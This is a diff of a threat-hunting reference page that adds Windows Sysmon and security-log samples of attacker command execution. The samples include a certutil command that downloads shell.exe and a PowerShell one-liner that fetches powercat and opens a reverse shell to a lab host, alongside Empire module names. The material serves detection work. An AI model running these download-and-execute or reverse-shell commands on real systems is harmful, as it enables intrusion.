@@ -31,12 +31,95 @@ Adversaries may abuse these technologies in various ways as a means of executing
 ## Potential Commands
 
 ```
-\\Windows\\.+\\cmd.exe
 cmd.exe|/c
-powershell/lateral_movement/invoke_sqloscmd
+\\Windows\\.+\\cmd.exe
 powershell/lateral_movement/invoke_sqloscmd
 powershell/management/spawnas
-powershell/management/spawnas
+Log
+#sysmon log
+EventID: 1
+Image: C: \ Windows \ System32 \ certutil.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: CertUtil.exe
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: CertUtil.exe
+CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe
+
+# Win7 security log
+EventID: 4688
+Process information:
+New Process ID: 0xbcc
+New Process Name: C: \ Windows \ System32 \ certutil.exe
+
+#windows server 2008 (excluding 2008) or more systems can be configured to create a policy review process, achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters.
+Log
+EventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded
+Process information:
+New Process ID: 0x474
+New Process Name: C: \ Windows \ System32 \ cmd.exe
+
+EventID: 4688
+Process information:
+New Process ID: 0x3f8
+New Process Name: C: \ Users \ 12306Br0 \ Desktop \ a \ payload.exe
+
+EventID: 5156
+Application Information:
+Process ID: 1016
+Application Name: \ device \ harddiskvolume2 \ users \ 12306br0 \ desktop \ a \ payload.exe
+
+Internet Information:
+Direction: Outbound
+Source address: 192.168.126.149
+Source Port: 49221
+Destination address: 192.168.126.146
+Destination Port: 53
+Protocol: 6
+
+EventID: 1 #sysmon log
+Image: C: \ Windows \ System32 \ cmd.exe
+FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
+Description: Windows Command Processor
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: C: \ Windows \ system32 \ cmd.exe / C C: \ Users \ 12306Br0 \ Desktop \ a \ payload.exe
+CurrentDirectory: C: \ Windows \ system32 \
+User: 12306Br0-PC \ 12306Br0
+LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}
+LogonId: 0x550ac
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
+ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}
+ParentProcessId: 1112
+ParentImage: C: \ Windows \ System32 \ ftp.exe
+ParentCommandLine: ftp
+Log
+#sysmon log
+EventID: 1
+Image: C: \ Windows \ System32 \ WindowsPowerShell \ v1.0 \ powershell.exe
+FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
+Description: Windows PowerShell
+Product: Microsoft Windows Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell -c "IEX (New-Object System.Net.WebClient) .DownloadString ( 'http://192.168.126.146/powercat.ps1'); powercat -c 192.168.126.146 -p 1234 -e cmd"
+
+# Win7 security log
+EventID: 4688
+Process information:
+New Process ID: 0x330
+New Process Name: C: \ Windows \ System32 \ cmd.exe
+Token Type lift: TokenElevationTypeLimited (3)
+
+EventID: 4688
+Process information:
+New Process ID: 0xa44
+New Process Name: C: \ Windows \ System32 \ WindowsPowerShell \ v1.0 \ powershell.exe
+
+#Powershell V5 (V5 containing more than) configuration audit policy, you can achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters. Of course, it can also be used to configure windows server 2008 (excluding 2008) over the audit process to create a policy, you can also record on the command line parameters, and finally to monitoring results.
 ```
 
 ## Commands Dataset
@@ -59,7 +142,117 @@ powershell/management/spawnas
   'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
  {'command': 'powershell/management/spawnas',
   'name': 'Empire Module Command',
-  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
+  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
+ {'command': 'Log\n'
+             '#sysmon log\n'
+             'EventID: 1\n'
+             'Image: C: \\ Windows \\ System32 \\ certutil.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: CertUtil.exe\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: CertUtil.exe\n'
+             'CommandLine: certutil.exe -urlcache -split -f '
+             'http://192.168.126.146:1234/shell.exe shell.exe\n'
+             '\n'
+             '# Win7 security log\n'
+             'EventID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0xbcc\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ certutil.exe\n'
+             '\n'
+             '#windows server 2008 (excluding 2008) or more systems can be '
+             'configured to create a policy review process, achieve the effect '
+             'of recording the command-line parameters. Monitoring and '
+             'analysis conducted by command line parameters.',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Log\n'
+             'EventID: 4688 # security logs, windows server 2012 above '
+             'configuration audit policy, command parameters can be recorded\n'
+             'Process information:\n'
+             'New Process ID: 0x474\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             '\n'
+             'EventID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0x3f8\n'
+             'New Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ '
+             'payload.exe\n'
+             '\n'
+             'EventID: 5156\n'
+             'Application Information:\n'
+             'Process ID: 1016\n'
+             'Application Name: \\ device \\ harddiskvolume2 \\ users \\ '
+             '12306br0 \\ desktop \\ a \\ payload.exe\n'
+             '\n'
+             'Internet Information:\n'
+             'Direction: Outbound\n'
+             'Source address: 192.168.126.149\n'
+             'Source Port: 49221\n'
+             'Destination address: 192.168.126.146\n'
+             'Destination Port: 53\n'
+             'Protocol: 6\n'
+             '\n'
+             'EventID: 1 #sysmon log\n'
+             'Image: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             'FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\n'
+             'Description: Windows Command Processor\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: Cmd.Exe\n'
+             'CommandLine: C: \\ Windows \\ system32 \\ cmd.exe / C C: \\ '
+             'Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\n'
+             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
+             'User: 12306Br0-PC \\ 12306Br0\n'
+             'LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}\n'
+             'LogonId: 0x550ac\n'
+             'TerminalSessionId: 1\n'
+             'IntegrityLevel: High\n'
+             'Hashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8\n'
+             'ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}\n'
+             'ParentProcessId: 1112\n'
+             'ParentImage: C: \\ Windows \\ System32 \\ ftp.exe\n'
+             'ParentCommandLine: ftp',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
+ {'command': 'Log\n'
+             '#sysmon log\n'
+             'EventID: 1\n'
+             'Image: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ '
+             'powershell.exe\n'
+             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
+             'Description: Windows PowerShell\n'
+             'Product: Microsoft Windows Operating System\n'
+             'Company: Microsoft Corporation\n'
+             'OriginalFileName: PowerShell.EXE\n'
+             'CommandLine: powershell -c "IEX (New-Object '
+             'System.Net.WebClient) .DownloadString ( '
+             "'http://192.168.126.146/powercat.ps1'); powercat -c "
+             '192.168.126.146 -p 1234 -e cmd"\n'
+             '\n'
+             '# Win7 security log\n'
+             'EventID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0x330\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n'
+             'Token Type lift: TokenElevationTypeLimited (3)\n'
+             '\n'
+             'EventID: 4688\n'
+             'Process information:\n'
+             'New Process ID: 0xa44\n'
+             'New Process Name: C: \\ Windows \\ System32 \\ WindowsPowerShell '
+             '\\ v1.0 \\ powershell.exe\n'
+             '\n'
+             '#Powershell V5 (V5 containing more than) configuration audit '
+             'policy, you can achieve the effect of recording the command-line '
+             'parameters. Monitoring and analysis conducted by command line '
+             'parameters. Of course, it can also be used to configure windows '
+             'server 2008 (excluding 2008) over the audit process to create a '
+             'policy, you can also record on the command line parameters, and '
+             'finally to monitoring results.',
+  'name': 'Log',
+  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
 ```
 
 ## Potential Detections
